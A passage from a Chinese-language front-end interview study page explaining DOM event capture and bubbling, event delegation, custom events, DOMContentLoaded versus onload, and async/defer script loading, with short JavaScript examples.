href="#innerhtml-和-innertext的区别" class="header-anchor">#</a> <strong>innerHTML 和 innerText的区别</strong></h5> <ul><li><strong>innerHTML</strong>: 也就是从对象的起始位置到终止位置的全部内容,<strong>包括Html标签</strong>。</li> <li><strong>innerText</strong>: 从起始位置到终止位置的内容, <strong>但它去除Html标签</strong></li></ul> <h5 id="documen-write和-innerhtml的区别"><a href="#documen-write和-innerhtml的区别" class="header-anchor">#</a> <strong>documen.write和 innerHTML的区别</strong></h5> <ul><li><strong>document.write</strong>：只能重绘整个页面</li> <li><strong>innerHTML</strong>：可以重绘页面的一部分</li></ul> <h4 id="事件模型"><a href="#事件模型" class="header-anchor">#</a> 事件模型</h4> <p>DOM2.0 模型将事件处理流程分为三个阶段，即 <strong>事件捕获阶段</strong>、<strong>事件处理阶段</strong>、<strong>事件冒泡阶段</strong>;</p> <p><strong>在DOM标准事件模型中，是先捕获后冒泡</strong>。<strong>IE只支持事件冒泡。添加事件方式时，默认是不捕获只做冒泡出来</strong>;</p> <ul><li><strong>事件捕获</strong>：当用户触发点击事件后，顶层对象 document 就会发出一个事件流，从最外层的 DOM 节点向目标元素节点传递，最终到达目标元素。</li> <li><strong>事件处理</strong>：当到达目标元素之后，执行目标元素绑定的处理函数。<strong>如果没有绑定监听函数，则不做任何处理。</strong></li> <li><strong>事件冒泡</strong>：事件流从目标元素开始，向最外层DOM节点传递，途中如果有节点绑定了事件处理函数，这些函数就会被执行。</li></ul> <p><img src="/rat-summ/assets/img/17-41-22.8f81c10d.jpg" alt="17-41-22"></p> <p>总括：</p> <ul><li>事件捕获：由最不具体的元素接收，并往下传播</li> <li>事件冒泡：由最具体的元素接收，并往上传播</li> <li>DOM事件流：事件捕获 -&gt; 目标阶段 -&gt; 事件冒泡</li></ul> <p>第三个变量传一个布尔值，需不需要阻止冒泡，默认值为false，将使用冒泡传播; 可以设置true，使用捕获传播;</p> <ul><li>false- 默认。事件句柄在冒泡阶段执行</li> <li>true - 事件句柄在捕获阶段执行</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>element<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">,</span> useCapture<span class="token punctuation">)</span>
<span class="token comment">//useCapture	可选。布尔值，指定事件是否在捕获或冒泡阶段执行。</span>
<span class="token comment">//true - 事件句柄在捕获阶段执行</span>
<span class="token comment">//false- false- 默认。事件句柄在冒泡阶段执行</span>

<span class="token comment">//可以使用removeEventListener() 方法来移除 addEventListener() 方法添加的事件句柄。</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myDIV&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;mousemove&quot;</span><span class="token punctuation">,</span> myFunction<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><blockquote><h4 id="如果要让事件先冒泡后捕获-怎么方案"><a href="#如果要让事件先冒泡后捕获-怎么方案" class="header-anchor">#</a> 如果要让事件先冒泡后捕获，怎么方案</h4></blockquote> <p><strong>在DOM标准事件模型中，是先捕获后冒泡</strong>。但是如果要实现先冒泡后捕获的效果，对于同一个事件，监听捕获和冒泡，分别对应相应的处理函数，监听到捕获事件，<strong>先暂缓执行，直到冒泡事件被捕获后再执行捕获之间</strong>。</p> <h5 id="绑定点击事件三种方式"><a href="#绑定点击事件三种方式" class="header-anchor">#</a> 绑定点击事件三种方式</h5> <ul><li><code>xxx.onclick = function (){}</code></li> <li><code>&lt;xxx onclick=&quot;&quot;&gt;&lt;/xxx&gt;</code></li> <li><code>xxx.addEventListence('click', function(){}, false)</code></li></ul> <h5 id="阻止冒泡-默认行为"><a href="#阻止冒泡-默认行为" class="header-anchor">#</a> <strong>阻止冒泡/默认行为</strong></h5> <ul><li>阻止事件传播(冒泡): e.stopPropagation(), （旧ie的方法 <strong>ev.cancelBubble = true</strong>;）</li> <li>阻止默认行为: e.preventDefault()</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">stopBubble</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment">//IE用cancelBubble=true来阻止而FF下需要用stopPropagation方法</span>
    <span class="token keyword">var</span> evt <span class="token operator">=</span> e <span class="token operator">||</span> window<span class="token punctuation">.</span>event<span class="token punctuation">;</span> 
    evt<span class="token punctuation">.</span>stopPropagation<span class="token operator">?</span> evt<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>evt<span class="token punctuation">.</span>cancelBubble<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
$xxx<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    e<span class="token punctuation">.</span>cancelBubble <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment">// ie</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">//简化写法</span>
<span class="token keyword">function</span> <span class="token function">stopBubble</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>stopPropagation<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    window<span class="token punctuation">.</span>event<span class="token punctuation">.</span>cancelBubble <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p><strong>阻止事件默认行为</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">stopDefault</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>preventDefault<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    window<span class="token punctuation">.</span>event<span class="token punctuation">.</span>returnValue <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="事件委托"><a href="#事件委托" class="header-anchor">#</a> 事件委托</h5> <p>事件委托指的是，<strong>不在事件的发生地（直接dom）上设置监听函数，而是在其父元素上设置监听函数</strong>，通过<strong>事件冒泡，父元素可以监听到子元素上事件的触发，通过判断事件发生元素DOM的类型，来做出不同的响应。</strong></p> <p>当所有子元素都需要绑定相同的事件的时候，可以把事件绑定在父元素上，这就是<code>事件委托</code>，<strong>优点有：</strong></p> <ul><li>绑定在父元素上只需要绑定一次，节省性能</li> <li>子元素不需要每个都去绑定同一事件</li> <li>如果后续又有新的子元素添加，会由于事件委托的原因，自动接收到父元素的事件监听</li></ul> <p>最经典的就是ul和li标签的事件监听，比如我们在添加事件时候，采用事件委托机制，不会在li标签上直接添加，而是在ul父元素上添加。<strong>比如事件代理就用到了代理模式</strong>,通过里面target可以获取到具体的li;</p> <ul><li>属性：event.currentTarget  //  指的是绑定了事件监听的元素（可以理解为<strong>触发事件元素的父级元素</strong>）；</li> <li>属性：event.target  // 表示<strong>当前被点击的元素</strong>；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>ul id<span class="token operator">=</span><span class="token string">&quot;ul&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token number">4</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token number">5</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    <span class="token keyword">let</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#ul'</span><span class="token punctuation">)</span>
    ul<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>因为存在太多的 <code>li</code>，不可能每个都去绑定事件。这时候可<strong>以通过给父节点绑定一个事件，让父节点作为代理去拿到真实点击的节点。</strong></p> <h5 id="自定义事件customevent"><a href="#自定义事件customevent" class="header-anchor">#</a> 自定义事件CustomEvent</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> ev <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ev'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomEvent</span><span class="token punctuation">(</span><span class="token string">'eventName'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    detail<span class="token operator">:</span> <span class="token punctuation">{</span>
        message<span class="token operator">:</span> <span class="token string">'Hello World'</span><span class="token punctuation">,</span>
        time<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    bubbles<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    cancelable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
ev<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'eventName'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ev<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//给节点分派一个合成事件</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h5 id="event事件的用法"><a href="#event事件的用法" class="header-anchor">#</a> Event事件的用法</h5> <ul><li>event.preventDefault()  // 阻止默认行为 ; 比如:	<code>&lt;a&gt;</code>有默认跳转功能；</li> <li>event.stopPropagation()  // 阻止冒泡行为 ；会立即停止对后续节点的访问，但是<strong>会执行完绑定到当前节点上的所有事件处理程序</strong>；</li> <li>event.stopImmediatePropagation()  //而调用stopImmediatePropagation函数之后，<strong>除了所有后续节点，绑定到当前元素上的、当前事件处理程序之后的事件处理程序就不会再执行了</strong>；</li> <li>属性：event.currentTarget  //  指的是绑定了事件监听的元素（可以理解为<strong>触发事件元素的父级元素</strong>）；</li> <li>属性：event.target  // 表示<strong>当前被点击的元素</strong>；</li></ul> <h4 id="dom文档加载的步骤"><a href="#dom文档加载的步骤" class="header-anchor">#</a> DOM文档加载的步骤</h4> <ul><li>1、解析HTML结构。</li> <li>2、加载外部脚本和样式表文件。</li> <li>3、解析并执行脚本代码。</li> <li>4、DOM树构建完成。// <code>DOMContentLoaded</code>触发、<code>$(document).ready</code>触发</li> <li>5、加载图片等外部文件。</li> <li>6、页面加载完毕。// <code>load</code>触发</li></ul> <h4 id="domcontentloaded-onload"><a href="#domcontentloaded-onload" class="header-anchor">#</a> DOMContentLoaded/onload</h4> <ul><li><p>DOMCOntentLoaded：指文档加载完成触发的事件，即<strong>dom加载完成，不用考虑其他资源，例如图片</strong></p> <p>常见的库中都提供了此事件的兼容各个浏览器的封装，如果你是个jQuery使用者，你可能会经常使用**$(document).ready(); 或者$(function(){}) 这都是使用了DOMContentLoaded事件**; DOMContentLoaded事件就相当于jquery中的ready方法，也就是DOM结构加载完成的事件。</p></li> <li><p>onload：当<strong>页面载入完毕后执行Javascript代码</strong>; 页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了。</p> <p><strong>window.onload和body.onload谁在下面就是谁覆盖谁，只会执行后面的那个。</strong></p></li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>addEventListener<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">function</span> <span class="token function">DOMContentLoaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;window.onload&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#status&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">&quot;DOM is ready now!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span> <span class="token string">&quot;DOMContentLoaded&quot;</span><span class="token punctuation">,</span> DOMContentLoaded<span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
    <span class="token punctuation">}</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">οnlοad</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        onsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;DOMContentLoaded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#status&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">&quot;DOM is ready AND wondow.onload is excute!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>console.log(<span class="token punctuation">'</span>bodyonload<span class="token punctuation">'</span>);<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>div1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p><strong>执行顺序</strong>: 在chrome、IE10和FireFox亲测，执行结果是：<code>DOMContentLoaded然后才是onload的输出</code>。<strong>所以说一般情况下，DOMContentLoaded事件要在window.onload之前执行，当DOM树构建完成的时候就会执行DOMContentLoaded事件</strong>。当window.onload事件触发时，页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了。</p> <p>**$(document).ready()**下面三个写法是等价的：</p> <ul><li><code>$(document).ready(handler)</code>；</li> <li><code>$(handler)</code>；</li> <li><code>$().ready(handler)</code> 不推荐；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//$(document).ready()能同时编写多个//结果两次都输出</span>
<span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;Hello World&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;Hello again&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//window.onload不能同时编写多个。//以下代码无法正确执行，结果只输出第二个。会被覆盖掉</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;test1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;test2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><blockquote><h4 id="js怎么控制一次加载一张图片-加载完后再加载下一张"><a href="#js怎么控制一次加载一张图片-加载完后再加载下一张" class="header-anchor">#</a> js怎么控制一次加载一张图片，加载完后再加载下一张</h4></blockquote> <p>方法1：监听onload</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    obj<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://www.phpernote.com/uploadfiles/editor/201107240502201179.jpg&quot;</span><span class="token punctuation">;</span>
    obj<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'图片的宽度为：'</span><span class="token operator">+</span>obj<span class="token punctuation">.</span>width<span class="token operator">+</span><span class="token string">'；图片的高度为：'</span><span class="token operator">+</span>obj<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;mypic&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innnerHTML<span class="token operator">=</span><span class="token string">&quot;&lt;img src='&quot;</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">+</span><span class="token string">&quot;' /&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>mypic<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>onloading……<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>方法2：监听onreadystatechange， this.readyState</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    obj<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://www.phpernote.com/uploadfiles/editor/201107240502201179.jpg&quot;</span><span class="token punctuation">;</span>
    obj<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState<span class="token operator">==</span><span class="token string">&quot;complete&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'图片的宽度为：'</span><span class="token operator">+</span>obj<span class="token punctuation">.</span>width<span class="token operator">+</span><span class="token string">'；图片的高度为：'</span><span class="token operator">+</span>obj<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;mypic&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innnerHTML<span class="token operator">=</span><span class="token string">&quot;&lt;img src='&quot;</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">+</span><span class="token string">&quot;' /&gt;&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>mypic<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>onloading……<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="异步-延迟-加载js的方式【要点】"><a href="#异步-延迟-加载js的方式【要点】" class="header-anchor">#</a> 异步(延迟)加载JS的方式【要点】</h4> <ul><li><p>1、async;<code>&lt;script async src=&quot;script.js&quot;&gt;&lt;/script&gt;</code>：给script标签加async属性，则加载和渲染后续文档元素的过程将和 <code>script.js</code> 的加载与执行并行进行（异步）；需要注意的是，**这种方式加载的 JavaScript 依然会阻塞 load 事件。**换句话说，<strong>async-script 可能在 DOMContentLoaded 触发之前或之后执行，但一定在 load 触发之前执行。</strong></p></li> <li><p>2、defer; <code>&lt;script defer src=&quot;script.js&quot;&gt;&lt;/script&gt;</code>：给script标签加defer属性，加载后续文档元素的过程将和 <code>script.js</code> 的加载并行进行（异步），<strong>但是 <code>script.js</code> 的执行要在所有元素解析完成之后，<code>DOMContentLoaded</code> 事件触发之前完成</strong></p></li> <li><p>3、动态创建script标签：等到<code>DOMContentLoaded</code> 事件触发时，生成一个script标签，渲染到页面上上；</p> <p><strong>hack的方式</strong>；创建script，插入到DOM中，加载完毕后callBack; 动态创建DOM方式（<strong>用得最多</strong>）；</p></li> <li><p>4、setTimeout定时器延迟代码执行；</p></li> <li><p>5、按需异步载入js；</p></li></ul> <p><strong>JS优化</strong>： <code>&lt;script&gt;</code> 标签加上 defer属性 和 